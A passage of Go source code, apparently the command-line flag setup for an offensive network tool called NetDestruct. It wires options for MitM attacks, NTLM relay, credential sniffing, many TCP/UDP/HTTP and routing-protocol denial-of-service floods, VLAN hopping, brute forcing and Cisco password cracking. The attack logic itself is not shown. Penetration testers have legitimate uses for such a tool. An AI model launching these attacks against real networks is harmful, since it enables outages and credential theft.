	rootCmd.Flags().StringVar(&flags.iface1, "interface1", "", "802.1X MitM authenticator-side interface")
	rootCmd.Flags().StringVar(&flags.iface2, "interface2", "", "802.1X MitM supplicant-side interface")

	// MitM — SMB Relay
	rootCmd.Flags().BoolVar(&flags.doSMBRelay, "smb-relay", false, "Intercept NTLM auth and relay to target (requires root)")
	rootCmd.Flags().StringVar(&flags.relayFrom, "relay-from", "", "Victim IP to relay NTLM auth from (optional; default: any poisoned host)")
	rootCmd.Flags().StringVar(&flags.relayTo, "relay-to", "", "Target IP to relay NTLM auth to")

	// MitM — Credential Sniffing
	rootCmd.Flags().BoolVar(&flags.doCredSniff, "cred-sniffing", false, "Credential sniffing: FTP/SMTP/IRC/HTTP/LDAP/NTLM/Kerberos/SNMP/MSSQL (requires root)")
	rootCmd.Flags().StringVar(&flags.ignoreIP, "ignore", "", "Skip packets from/to this IP while sniffing credentials")
	rootCmd.Flags().StringVar(&flags.pcapFile, "pcap-file", "", "Parse a single .pcap file for sniffing credentials")
	rootCmd.Flags().StringVar(&flags.pcapDir, "pcap-dir", "", "Recursively parse all .pcap files in a directory for sniffing credentials")
	rootCmd.Flags().StringVar(&flags.outputDir, "output-dir", "", "Write per-protocol .txt files here for sniffing credentials")

	// DoS — Layer 2
	rootCmd.Flags().BoolVar(&flags.doMACFlood, "mac-flood", false, "MAC flood / CAM table overflow (requires root)")
	rootCmd.Flags().BoolVar(&flags.doCDPFlood, "cdp-flood", false, "CDP neighbor table overflow (requires root)")
	rootCmd.Flags().BoolVar(&flags.doDeleteAllVlans, "delete-all-vlans", false, "VTP delete-all VLANs DoS")
	rootCmd.Flags().BoolVar(&flags.doDeleteVlan, "delete-vlan", false, "VTP delete one VLAN DoS")
	rootCmd.Flags().BoolVar(&flags.doDos, "dos", false, "VTP DoS mode gate")
	rootCmd.Flags().BoolVar(&flags.doCatalystZeroDay, "catalyst-zero-day", false, "VTP Catalyst crash DoS")
	rootCmd.Flags().BoolVar(&flags.doAddVlan, "add-vlan", false, "VTP add one VLAN tampering")
	rootCmd.Flags().StringVar(&flags.vlanName, "vlan-name", "", "VTP add-vlan: VLAN name")
	rootCmd.Flags().IntVar(&flags.vtpRevision, "revision-number", -1, "VTP forged Configuration Revision (default: learned+1)")
	rootCmd.Flags().IntVar(&flags.cdpRate, "cdp-rate", 0, "CDP flood: packets per second (default: full speed)")
	rootCmd.Flags().BoolVar(&flags.doDHCPFlood, "dhcp-flood", false, "DHCP DoS")
	rootCmd.Flags().BoolVar(&flags.doDHCPDiscover, "discover", false, "DHCP DISCOVER pool exhaustion")
	rootCmd.Flags().BoolVar(&flags.doDHCPRelease, "release", false, "DHCP RELEASE lease cancellation")
	rootCmd.Flags().StringVar(&flags.dhcpPool, "dhcp-pool", "", "DHCP target IP range (e.g. 192.168.100.2-254)")
	rootCmd.Flags().IntVar(&flags.dhcpRate, "dhcp-rate", 0, "DHCP packets per second (default: full speed)")

	// DoS — ICMP
	rootCmd.Flags().BoolVar(&flags.doICMPFlood, "icmp-flood", false, "ICMP Echo Request flood (requires root)")

	// DoS — TCP
	rootCmd.Flags().BoolVar(&flags.doTCPSyn, "tcp-syn-flood", false, "TCP SYN flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPAck, "tcp-ack-flood", false, "TCP ACK flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPRst, "tcp-rst-flood", false, "TCP RST flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPPsh, "tcp-push-flood", false, "TCP PSH+ACK flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPZeroWin, "tcp-zero-window-flood", false, "TCP SYN+zero-window flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPNull, "tcp-null-flood", false, "TCP null (no flags) flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPOutOfOrder, "tcp-out-of-order-flood", false, "TCP out-of-order PSH+ACK flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPXmas, "tcp-xmas-tree-flood", false, "TCP Xmas FIN+PSH+URG flood (requires root)")
	rootCmd.Flags().BoolVar(&flags.doTCPFin, "tcp-fin-flood", false, "TCP FIN flood (requires root)")

	// DoS — UDP
	rootCmd.Flags().BoolVar(&flags.doUDPNormal, "udp-normal-flood", false, "UDP flood with correct checksum and 16-byte payload (requires root)")
	rootCmd.Flags().BoolVar(&flags.doUDPZeroLen, "udp-zero-length-flood", false, "UDP flood with 8-byte header only, no payload (requires root)")
	rootCmd.Flags().BoolVar(&flags.doUDPRandCksum, "udp-random-checksum-flood", false, "UDP flood with random (bad) checksum (requires root)")
	rootCmd.Flags().BoolVar(&flags.doUDPZeroCksum, "udp-zero-checksum-flood", false, "UDP flood with checksum=0 (RFC 768 disabled) (requires root)")

	// DoS — HTTP
	rootCmd.Flags().BoolVar(&flags.doHTTP10DOS, "http1.0-dos", false, "HTTP/1.0 connection flood — rapid reconnect GET requests")
	rootCmd.Flags().BoolVar(&flags.doHTTP11DOS, "http1.1-dos", false, "HTTP/1.1 Slowloris — exhaust server connection table with open sockets")
	rootCmd.Flags().BoolVar(&flags.doHTTP2DOS, "http2-dos", false, "HTTP/2 Rapid Reset flood (CVE-2023-44487) — HEADERS+RST_STREAM over TLS")
	rootCmd.Flags().BoolVar(&flags.doHTTP3DOS, "http3-dos", false, "HTTP/3 QUIC Initial packet flood — exhaust server QUIC connection state (UDP)")

	// DoS — Routing
	rootCmd.Flags().IntVar(&flags.asNumber, "as", 0, "Autonomous System Number")
	rootCmd.Flags().StringVar(&flags.srcIP, "src", "", "Source IP")
	rootCmd.Flags().BoolVar(&flags.doEIGRPBlackhole, "blackhole", false, "EIGRP static route blackhole")
	rootCmd.Flags().BoolVar(&flags.doEIGRPTableOverflow, "table-overflow", false, "EIGRP routing table overflow with random external routes")
	rootCmd.Flags().BoolVar(&flags.doEIGRPFakeNeighbors, "fake-neighbors", false, "EIGRP fake neighbor Hello flood")
	rootCmd.Flags().BoolVar(&flags.doEIGRPResetNeighbors, "reset-neighbors", false, "EIGRP neighborship reset via spoofed Hello")

	// Intelligence Gathering
	rootCmd.Flags().BoolVar(&flags.doARPScan, "arp-scan", false, "ARP host discovery (requires root)")
	rootCmd.Flags().BoolVar(&flags.doSMB, "smb", false, "SMB Protocol")
	rootCmd.Flags().BoolVar(&flags.doSMBVersion, "version", false, "SMB version / OS fingerprint")
	rootCmd.Flags().BoolVar(&flags.doSMBBrute, "brute", false, "Brute force")
	rootCmd.Flags().BoolVar(&flags.doTelnet, "telnet", false, "Telnet Protocol")
	rootCmd.Flags().BoolVar(&flags.doMemcached, "memcached", false, "Memcached Protocol")
	rootCmd.Flags().BoolVar(&flags.doActive, "active", false, "Active mode — send ARP requests and collect replies")
	rootCmd.Flags().BoolVar(&flags.doPassive, "passive", false, "Passive mode — sniff ARP traffic without sending")
	rootCmd.Flags().BoolVar(&flags.doCDP, "cdp", false, "CDP Protocol")
	rootCmd.Flags().BoolVar(&flags.doDHCPEnum, "dhcp", false, "DHCP Protocol")
	rootCmd.Flags().BoolVar(&flags.doDTP, "dtp", false, "DTP Protocol")
	rootCmd.Flags().BoolVar(&flags.doDot1Q, "802.1q", false, "802.1Q Protocol")
	rootCmd.Flags().BoolVar(&flags.doDot1X, "802.1x", false, "802.1X Protocol")
	rootCmd.Flags().StringVar(&flags.enumVal, "enum", "", "Enumeration mode")
	if ef := rootCmd.Flags().Lookup("enum"); ef != nil {
		ef.NoOptDefVal = enumFlagOn
	}
	rootCmd.Flags().BoolVar(&flags.doMemcachedFlush, "flush-all", false, "Invalidate all Memcached keys via flush_all")
	rootCmd.Flags().StringVar(&flags.memcachedSet, "set", "", "Set Memcached or SNMP key")
	if f := rootCmd.Flags().Lookup("set"); f != nil {
		f.NoOptDefVal = "true"
	}
	rootCmd.Flags().StringVar(&flags.memcachedDelete, "delete", "", "Delete Memcached key")
	rootCmd.Flags().StringVar(&flags.memcachedValue, "value", "", "Memcached value payload")
	rootCmd.Flags().BoolVar(&flags.doInject, "inject", false, "Injection mode")
	rootCmd.Flags().BoolVar(&flags.doEnableTrunk, "enable-trunk", false, "DTP enable trunking attack")
	rootCmd.Flags().BoolVar(&flags.doDoubleTag, "double-tag", false, "802.1Q double-tag VLAN bypass")
	rootCmd.Flags().BoolVar(&flags.doArpPoison, "arp-poison", false, "802.1Q ARP poison MitM")
	rootCmd.Flags().IntVar(&flags.srcVLAN, "src-vlan", -1, "802.1Q double-tag outer VLAN ID (0-4095)")
	rootCmd.Flags().IntVar(&flags.dstVLAN, "dst-vlan", -1, "802.1Q inner/target VLAN")
	rootCmd.Flags().StringVar(&flags.dot1qDstIP, "dst-ip", "", "Victim IP to poison")
	rootCmd.Flags().StringVar(&flags.dot1qSrcIP, "src-ip", "", "Spoofed source IP")
	rootCmd.Flags().StringVar(&flags.srcMAC, "src-mac", "", "Source MAC override (default: interface MAC)")
	rootCmd.Flags().StringVar(&flags.eapInfo, "eapinfo", "", "802.1X EAP Identity string in probe (default: Cisco Production)")
	rootCmd.Flags().StringVar(&flags.icmpPayload, "payload", "", "802.1Q ICMP echo payload string (default: Cisco Production)")
	rootCmd.Flags().StringVar(&flags.arpRange, "range", "", "ARP active scan: CIDR range (e.g. 192.168.1.0/24); default: auto-detect from interface")

	// Authentication Cracking
	rootCmd.Flags().StringVar(&flags.captureFile, "capture", "", "Pcap/pcapng file to analyse")
	rootCmd.Flags().BoolVar(&flags.doOSPFAnalysis, "ospf", false, "OSPF Protocol")
	rootCmd.Flags().BoolVar(&flags.doHSRPAnalysis, "hsrp", false, "HSR Protocol")
	rootCmd.Flags().BoolVar(&flags.doHSRPv2, "hsrpv2", false, "HSRPv2 Protocol")
	rootCmd.Flags().BoolVar(&flags.doEIGRPAnalysis, "eigrp", false, "EIGRP Protocol")
	rootCmd.Flags().BoolVar(&flags.doVRRPAnalysis, "vrrp", false, "VRRP Protocol")
	rootCmd.Flags().IntVar(&flags.fhGroup, "group", -1, "Group or virtual router ID (0-255)")
	rootCmd.Flags().StringVar(&flags.virtualIP, "virtual-ip", "", "Virtual IP address")
	rootCmd.Flags().StringVar(&flags.fhAuth, "auth", "", "Passphrase OR optional SNMPv3 auth protocol (MD5|SHA|SHA-224|SHA-256|SHA-384|SHA-512)")
	rootCmd.Flags().BoolVar(&flags.doGLBPAnalysis, "glbp", false, "GLBP Protocol")
	rootCmd.Flags().BoolVar(&flags.doNTPAnalysis, "ntp", false, "NTP Protocol")
	rootCmd.Flags().BoolVar(&flags.doBFDAnalysis, "bfd", false, "BFD Protocol")
	rootCmd.Flags().BoolVar(&flags.doVTPAnalysis, "vtp", false, "VTP Protocol")
	rootCmd.Flags().BoolVar(&flags.doRSVPAnalysis, "rsvp", false, "RSVP Protocol")
	rootCmd.Flags().BoolVar(&flags.doISISAnalysis, "is-is", false, "IS-IS Protocol")
	rootCmd.Flags().BoolVar(&flags.doTACACSplusAnalysis, "tacacs-plus", false, "TACACS+ Protocol")
	rootCmd.Flags().BoolVar(&flags.doCrack, "crack", false, "Crack extracted hashes via dictionary attack")
	rootCmd.Flags().StringVar(&flags.wordlist, "wordlist", "", "Wordlist file for dictionary attack")

	// Enumeration — TFTP
	rootCmd.Flags().StringVar(&flags.tftpServer, "tftp", "", "TFTP server host, host:port, or domain name (default port 69)")
	rootCmd.Flags().StringVar(&flags.getFiles, "get", "", "Comma-separated remote filenames to download/probe via TFTP")
	rootCmd.Flags().StringVar(&flags.putFiles, "put", "", "Comma-separated local file paths to upload via TFTP — remote name is the file's basename")

	// Enumeration — FTP
	rootCmd.Flags().StringVar(&flags.ftpServer, "ftp", "", "FTP server host, host:port, or domain name (default port 21)")
	rootCmd.Flags().StringVar(&flags.ftpBounce, "bounce", "", "FTP bounce scan: user:password@relay-host")
	rootCmd.Flags().BoolVar(&flags.doSSH, "ssh", false, "SSH Protocol")
	rootCmd.Flags().BoolVar(&flags.doSSHAuthMethods, "auth-methods", false, "Enumerate SSH supported auth methods")
	rootCmd.Flags().BoolVar(&flags.doSSHCipherEnum, "cipher-enum", false, "Enumerate SSHv2 algorithms, host keys, known-bad public key acceptance")
	rootCmd.Flags().BoolVar(&flags.doSSHKeyEnum, "key-enum", false, "Test SSH public/private keys for acceptance")
	rootCmd.Flags().IntVar(&flags.sshThreads, "threads", 0, "Brute parallel tasks (optional, default 16, max 64)")
	rootCmd.Flags().BoolVar(&flags.doSNMP, "snmp", false, "SNMP Protocol")
	rootCmd.Flags().BoolVar(&flags.doSNMPWalk, "walk", false, "SNMPv2c snmpwalk")
	rootCmd.Flags().BoolVar(&flags.doConfigDump, "config-dump", false, "SNMPv3 Cisco running-config dump to TFTP")
	rootCmd.Flags().BoolVar(&flags.snmpV1, "v1", false, "SNMPv1")
	rootCmd.Flags().BoolVar(&flags.snmpV2c, "v2c", false, "SNMPv2c")
	rootCmd.Flags().BoolVar(&flags.snmpV3, "v3", false, "SNMPv3")
	rootCmd.Flags().StringVar(&flags.snmpCommunity, "community", "", "SNMP community string")
	rootCmd.Flags().StringVar(&flags.snmpOID, "oid", "", "SNMP OID")
	rootCmd.Flags().StringVar(&flags.snmpTarget, "target", "", "Target IP address/host")
	rootCmd.Flags().IntVar(&flags.snmpRateMS, "rate-limit", 100, "Wait n milliseconds between probe packets (default 100)")
	rootCmd.Flags().StringVar(&flags.snmpTFTPServer, "tftp-server", "", "TFTP server IPv4")
	rootCmd.Flags().StringVar(&flags.snmpAuthPass, "auth-pass", "", "SNMPv3 authentication passphrase")
	rootCmd.Flags().StringVar(&flags.snmpPrivProto, "priv", "", "SNMPv3 privacy protocol: DES|AES|AES-192|AES-256")
	rootCmd.Flags().StringVar(&flags.snmpPrivPass, "priv-pass", "", "SNMPv3 privacy passphrase")
	rootCmd.Flags().BoolVar(&flags.ftpAnon, "anon", false, "Check anonymous FTP login (USER anonymous / PASS anonymous@)")
	rootCmd.Flags().BoolVar(&flags.ftpFeatures, "features", false, "List FTP server capabilities via FEAT command")
	rootCmd.Flags().StringVar(&flags.userList, "userlist", "", "Username wordlist")
	rootCmd.Flags().StringVar(&flags.passList, "passlist", "", "Password/community wordlist")
	rootCmd.Flags().StringVar(&flags.smbUser, "username", "", "Username for authentication")
	rootCmd.Flags().StringVar(&flags.smbPass, "password", "", "Password for authentication")

	// Cisco Passwords
	rootCmd.Flags().BoolVar(&flags.doCiscoPass, "cisco-pass", false, "Enable Cisco password cracking mode")
	rootCmd.Flags().StringVar(&flags.ciscoPassFile, "file", "", "File path")
	rootCmd.Flags().StringVar(&flags.hashValue, "hash", "", "Hash value to crack directly")
	rootCmd.Flags().BoolVar(&flags.doType4, "type4", false, "Crack Cisco Type 4 (enable secret 4 / raw SHA) hashes — requires wordlist; auto-detects SHA-1/224/256/3-256/384/512")
	rootCmd.Flags().BoolVar(&flags.doType5, "type5", false, "Crack Cisco Type 5 (enable secret 5 / md5crypt) hashes — requires wordlist")
	rootCmd.Flags().BoolVar(&flags.doType7, "type7", false, "Decrypt Cisco Type 7 (enable secret 7 / XOR cipher) passwords — no wordlist needed")
	rootCmd.Flags().BoolVar(&flags.doType8, "type8", false, "Crack Cisco Type 8 (enable secret 8 / PBKDF2-SHA256) hashes — requires wordlist")
	rootCmd.Flags().BoolVar(&flags.doType9, "type9", false, "Crack Cisco Type 9 (enable secret 9 / scrypt N=16384 r=1 p=1) hashes — requires wordlist")

	rootCmd.SetUsageFunc(func(cmd *cli.Command) error {
		fmt.Println("Usage:")
		fmt.Println("  NetDestruct [flags]")
		fmt.Println()

		groups := make(map[string][]string)

		cmd.Flags().VisitAll(func(f *cli.Flag) {
			group := flagGroups[f.Name]
			if group == "" {
				group = "Other"
			}
			line := fmt.Sprintf("      --%-30s %s", f.Name, f.Usage)
			if f.Shorthand != "" {
				line = fmt.Sprintf("  -%s, --%-30s %s", f.Shorthand, f.Name, f.Usage)
			}
			groups[group] = append(groups[group], line)
		})

		order := []string{
			"Shared",
			"MitM — Name Resolution",
			"MitM — ARP Poisoning",
			"MitM — STP",
			"MitM — Hijacking",
			"MitM — FHRP",
			"MitM — ICMP",
			"MitM — 802.1X",
			"MitM — 802.1Q",
			"MitM — DNS",
			"MitM — DHCP",
			"MitM — SMB Relay",
			"MitM — Credential Sniffing",
			"DoS — Layer 2",
			"DoS — ICMP",
			"DoS — TCP",
			"DoS — UDP",
			"DoS — HTTP",
			"DoS — Routing",
			"DoS — Application",
			"Intelligence Gathering",
			"Data Manipulation",
			"Vlan Bypassing",
			"Enumeration",
			"Authentication Cracking",
			"Cisco Passwords",
			"Other",
		}
		for _, group := range order {
			if lines, ok := groups[group]; ok {
				fmt.Printf("[%s]\n", group)
				for _, line := range lines {
					fmt.Println(line)
				}
				fmt.Println()
			}
		}

		return nil
	})

	if err := rootCmd.Execute(); err != nil {
		fmt.Println(err)
		os.Exit(1)
	}
}
